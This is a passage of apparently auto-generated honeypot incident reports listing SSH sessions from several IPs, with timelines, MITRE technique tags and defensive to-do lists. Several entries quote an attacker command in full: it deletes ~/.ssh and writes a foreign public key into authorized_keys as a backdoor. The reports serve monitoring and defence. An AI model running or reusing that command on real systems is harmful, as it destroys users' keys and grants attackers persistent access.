### 🔴 HIGH · IR-87df10e6303c

| Field | Detail |
|---|---|
| **Source IP** | `36.64.131[.]68` |
| **First Seen** | 2026-07-03 05:17 |
| **Last Seen** | 2026-07-03 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:17:22` | `cowrie.session.connect` |
| `2026-07-03 05:17:22` | `cowrie.client.version` |
| `2026-07-03 05:17:22` | `cowrie.client.kex` |
| `2026-07-03 05:17:23` | `cowrie.login.success` |
| `2026-07-03 05:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.131[.]68` to AbuseIPDB if not already reported
- [ ] Block `36.64.131[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9efd129b9d6c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 05:21 |
| **Last Seen** | 2026-07-03 05:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:21:06` | `cowrie.session.connect` |
| `2026-07-03 05:21:07` | `cowrie.client.version` |
| `2026-07-03 05:21:07` | `cowrie.client.kex` |
| `2026-07-03 05:21:14` | `cowrie.login.success` |
| `2026-07-03 05:21:17` | `cowrie.session.params` |
| `2026-07-03 05:21:17` | `cowrie.command.input` |
| `2026-07-03 05:21:19` | `cowrie.log.closed` |
| `2026-07-03 05:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5fdbe9e166c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 05:32 |
| **Last Seen** | 2026-07-03 05:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:32:26` | `cowrie.session.connect` |
| `2026-07-03 05:32:28` | `cowrie.client.version` |
| `2026-07-03 05:32:28` | `cowrie.client.kex` |
| `2026-07-03 05:32:34` | `cowrie.login.success` |
| `2026-07-03 05:32:38` | `cowrie.session.params` |
| `2026-07-03 05:32:38` | `cowrie.command.input` |
| `2026-07-03 05:32:39` | `cowrie.log.closed` |
| `2026-07-03 05:32:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b867e7f1055

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 05:43 |
| **Last Seen** | 2026-07-03 05:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:43:55` | `cowrie.session.connect` |
| `2026-07-03 05:43:56` | `cowrie.client.version` |
| `2026-07-03 05:43:56` | `cowrie.client.kex` |
| `2026-07-03 05:44:03` | `cowrie.login.success` |
| `2026-07-03 05:44:06` | `cowrie.session.params` |
| `2026-07-03 05:44:06` | `cowrie.command.input` |
| `2026-07-03 05:44:08` | `cowrie.log.closed` |
| `2026-07-03 05:44:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6692ae42c12

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-07-03 05:46 |
| **Last Seen** | 2026-07-03 05:46 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:46:36` | `cowrie.session.connect` |
| `2026-07-03 05:46:36` | `cowrie.client.version` |
| `2026-07-03 05:46:36` | `cowrie.client.kex` |
| `2026-07-03 05:46:38` | `cowrie.login.success` |
| `2026-07-03 05:46:39` | `cowrie.session.params` |
| `2026-07-03 05:46:39` | `cowrie.command.input` |
| `2026-07-03 05:46:39` | `cowrie.command.failed` |
| `2026-07-03 05:46:40` | `cowrie.log.closed` |
| `2026-07-03 05:46:40` | `cowrie.session.params` |
| `2026-07-03 05:46:40` | `cowrie.command.input` |
| `2026-07-03 05:46:41` | `cowrie.session.file_download` |
| `2026-07-03 05:46:41` | `cowrie.log.closed` |
| `2026-07-03 05:46:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fef8df6a06

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-07-03 05:46 |
| **Last Seen** | 2026-07-03 05:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:46:41` | `cowrie.session.connect` |
| `2026-07-03 05:46:41` | `cowrie.client.version` |
| `2026-07-03 05:46:41` | `cowrie.client.kex` |
| `2026-07-03 05:46:43` | `cowrie.login.success` |
| `2026-07-03 05:46:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fdcfaccce30

| Field | Detail |
|---|---|
| **Source IP** | `182.71.135[.]110` |
| **First Seen** | 2026-07-03 05:46 |
| **Last Seen** | 2026-07-03 05:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:46:43` | `cowrie.session.connect` |
| `2026-07-03 05:46:43` | `cowrie.client.version` |
| `2026-07-03 05:46:44` | `cowrie.client.kex` |
| `2026-07-03 05:46:45` | `cowrie.login.success` |
| `2026-07-03 05:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.71.135[.]110` to AbuseIPDB if not already reported
- [ ] Block `182.71.135[.]110` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f6e98ab78d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 05:47 |
| **Last Seen** | 2026-07-03 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:47:32` | `cowrie.session.connect` |
| `2026-07-03 05:47:32` | `cowrie.client.version` |
| `2026-07-03 05:47:33` | `cowrie.client.kex` |
| `2026-07-03 05:47:33` | `cowrie.login.success` |
| `2026-07-03 05:47:33` | `cowrie.direct-tcpip.request` |
| `2026-07-03 05:47:33` | `cowrie.direct-tcpip.data` |
| `2026-07-03 05:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cbd85aabe7e

| Field | Detail |
|---|---|
| **Source IP** | `78.39.48[.]166` |
| **First Seen** | 2026-07-03 05:50 |
| **Last Seen** | 2026-07-03 05:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:50:21` | `cowrie.session.connect` |
| `2026-07-03 05:50:21` | `cowrie.client.version` |
| `2026-07-03 05:50:21` | `cowrie.client.kex` |
| `2026-07-03 05:50:22` | `cowrie.login.success` |
| `2026-07-03 05:50:23` | `cowrie.session.params` |
| `2026-07-03 05:50:23` | `cowrie.command.input` |
| `2026-07-03 05:50:23` | `cowrie.command.failed` |
| `2026-07-03 05:50:23` | `cowrie.log.closed` |
| `2026-07-03 05:50:24` | `cowrie.session.params` |
| `2026-07-03 05:50:24` | `cowrie.command.input` |
| `2026-07-03 05:50:24` | `cowrie.session.file_download` |
| `2026-07-03 05:50:24` | `cowrie.log.closed` |
| `2026-07-03 05:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.39.48[.]166` to AbuseIPDB if not already reported
- [ ] Block `78.39.48[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2155664db6f6

| Field | Detail |
|---|---|
| **Source IP** | `78.39.48[.]166` |
| **First Seen** | 2026-07-03 05:50 |
| **Last Seen** | 2026-07-03 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:50:24` | `cowrie.session.connect` |
| `2026-07-03 05:50:24` | `cowrie.client.version` |
| `2026-07-03 05:50:24` | `cowrie.client.kex` |
| `2026-07-03 05:50:25` | `cowrie.login.success` |
| `2026-07-03 05:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.39.48[.]166` to AbuseIPDB if not already reported
- [ ] Block `78.39.48[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-237883f75158

| Field | Detail |
|---|---|
| **Source IP** | `78.39.48[.]166` |
| **First Seen** | 2026-07-03 05:50 |
| **Last Seen** | 2026-07-03 05:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:50:25` | `cowrie.session.connect` |
| `2026-07-03 05:50:25` | `cowrie.client.version` |
| `2026-07-03 05:50:26` | `cowrie.client.kex` |
| `2026-07-03 05:50:26` | `cowrie.login.success` |
| `2026-07-03 05:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.39.48[.]166` to AbuseIPDB if not already reported
- [ ] Block `78.39.48[.]166` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-120f57f7873b

| Field | Detail |
|---|---|
| **Source IP** | `160.22.170[.]237` |
| **First Seen** | 2026-07-03 05:51 |
| **Last Seen** | 2026-07-03 05:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:51:57` | `cowrie.session.connect` |
| `2026-07-03 05:51:57` | `cowrie.client.version` |
| `2026-07-03 05:51:57` | `cowrie.client.kex` |
| `2026-07-03 05:51:58` | `cowrie.login.success` |
| `2026-07-03 05:51:59` | `cowrie.session.params` |
| `2026-07-03 05:51:59` | `cowrie.command.input` |
| `2026-07-03 05:51:59` | `cowrie.command.failed` |
| `2026-07-03 05:52:00` | `cowrie.log.closed` |
| `2026-07-03 05:52:01` | `cowrie.session.params` |
| `2026-07-03 05:52:01` | `cowrie.command.input` |
| `2026-07-03 05:52:01` | `cowrie.session.file_download` |
| `2026-07-03 05:52:01` | `cowrie.log.closed` |
| `2026-07-03 05:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.170[.]237` to AbuseIPDB if not already reported
- [ ] Block `160.22.170[.]237` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8daba6fc3c

| Field | Detail |
|---|---|
| **Source IP** | `160.22.170[.]237` |
| **First Seen** | 2026-07-03 05:52 |
| **Last Seen** | 2026-07-03 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:52:02` | `cowrie.session.connect` |
| `2026-07-03 05:52:02` | `cowrie.client.version` |
| `2026-07-03 05:52:02` | `cowrie.client.kex` |
| `2026-07-03 05:52:03` | `cowrie.login.success` |
| `2026-07-03 05:52:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.170[.]237` to AbuseIPDB if not already reported
- [ ] Block `160.22.170[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eace3e313a95

| Field | Detail |
|---|---|
| **Source IP** | `160.22.170[.]237` |
| **First Seen** | 2026-07-03 05:52 |
| **Last Seen** | 2026-07-03 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:52:04` | `cowrie.session.connect` |
| `2026-07-03 05:52:04` | `cowrie.client.version` |
| `2026-07-03 05:52:04` | `cowrie.client.kex` |
| `2026-07-03 05:52:05` | `cowrie.login.success` |
| `2026-07-03 05:52:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.22.170[.]237` to AbuseIPDB if not already reported
- [ ] Block `160.22.170[.]237` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b449ab9a2941

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 05:55 |
| **Last Seen** | 2026-07-03 05:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 05:55:17` | `cowrie.session.connect` |
| `2026-07-03 05:55:18` | `cowrie.client.version` |
| `2026-07-03 05:55:18` | `cowrie.client.kex` |
| `2026-07-03 05:55:24` | `cowrie.login.success` |
| `2026-07-03 05:55:26` | `cowrie.session.params` |
| `2026-07-03 05:55:26` | `cowrie.command.input` |
| `2026-07-03 05:55:28` | `cowrie.log.closed` |
| `2026-07-03 05:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53009eba8c3d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 06:01 |
| **Last Seen** | 2026-07-03 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:01:26` | `cowrie.session.connect` |
| `2026-07-03 06:01:26` | `cowrie.client.version` |
| `2026-07-03 06:01:26` | `cowrie.client.kex` |
| `2026-07-03 06:01:26` | `cowrie.login.success` |
| `2026-07-03 06:01:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adbb936e1336

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 06:01 |
| **Last Seen** | 2026-07-03 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:01:27` | `cowrie.session.connect` |
| `2026-07-03 06:01:27` | `cowrie.client.version` |
| `2026-07-03 06:01:27` | `cowrie.client.kex` |
| `2026-07-03 06:01:27` | `cowrie.login.success` |
| `2026-07-03 06:01:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6794ae6d461c

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 06:01 |
| **Last Seen** | 2026-07-03 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:01:32` | `cowrie.session.connect` |
| `2026-07-03 06:01:32` | `cowrie.client.version` |
| `2026-07-03 06:01:32` | `cowrie.client.kex` |
| `2026-07-03 06:01:32` | `cowrie.login.success` |
| `2026-07-03 06:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6942c1d40c3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-03 06:01 |
| **Last Seen** | 2026-07-03 06:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:01:32` | `cowrie.session.connect` |
| `2026-07-03 06:01:32` | `cowrie.client.version` |
| `2026-07-03 06:01:32` | `cowrie.client.kex` |
| `2026-07-03 06:01:32` | `cowrie.login.success` |
| `2026-07-03 06:01:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d870c477a0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 06:06 |
| **Last Seen** | 2026-07-03 06:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:06:50` | `cowrie.session.connect` |
| `2026-07-03 06:06:51` | `cowrie.client.version` |
| `2026-07-03 06:06:51` | `cowrie.client.kex` |
| `2026-07-03 06:06:57` | `cowrie.login.success` |
| `2026-07-03 06:07:00` | `cowrie.session.params` |
| `2026-07-03 06:07:00` | `cowrie.command.input` |
| `2026-07-03 06:07:02` | `cowrie.log.closed` |
| `2026-07-03 06:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4866f28d5853

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 06:11 |
| **Last Seen** | 2026-07-03 06:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:11:39` | `cowrie.session.connect` |
| `2026-07-03 06:11:39` | `cowrie.client.version` |
| `2026-07-03 06:11:39` | `cowrie.client.kex` |
| `2026-07-03 06:11:39` | `cowrie.login.success` |
| `2026-07-03 06:11:40` | `cowrie.session.params` |
| `2026-07-03 06:11:40` | `cowrie.command.input` |
| `2026-07-03 06:11:40` | `cowrie.log.closed` |
| `2026-07-03 06:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9b89b05b49

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 06:17 |
| **Last Seen** | 2026-07-03 06:18 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:17:55` | `cowrie.session.connect` |
| `2026-07-03 06:17:56` | `cowrie.client.version` |
| `2026-07-03 06:17:58` | `cowrie.client.kex` |
| `2026-07-03 06:18:02` | `cowrie.login.success` |
| `2026-07-03 06:18:06` | `cowrie.session.params` |
| `2026-07-03 06:18:06` | `cowrie.command.input` |
| `2026-07-03 06:18:08` | `cowrie.log.closed` |
| `2026-07-03 06:18:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15222e60a473

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-03 06:20 |
| **Last Seen** | 2026-07-03 06:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 06:20:09` | `cowrie.session.connect` |
| `2026-07-03 06:20:09` | `cowrie.client.version` |
| `2026-07-03 06:20:09` | `cowrie.client.kex` |
| `2026-07-03 06:20:10` | `cowrie.login.success` |
| `2026-07-03 06:20:11` | `cowrie.session.params` |
| `2026-07-03 06:20:11` | `cowrie.command.input` |
| `2026-07-03 06:20:11` | `cowrie.command.failed` |
| `2026-07-03 06:20:12` | `cowrie.log.closed` |
| `2026-07-03 06:20:12` | `cowrie.session.params` |
| `2026-07-03 06:20:12` | `cowrie.command.input` |
| `2026-07-03 06:20:13` | `cowrie.session.file_download` |
| `2026-07-03 06:20:13` | `cowrie.log.closed` |
| `2026-07-03 06:20:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.182.132[.]154` to AbuseIPDB if not already reported
- [ ] Block `103.182.132[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2e2d7359d03

| Field | Detail |
|---|---|
| **Source IP** | `103.182.132[.]154` |
| **First Seen** | 2026-07-03 06:20 |
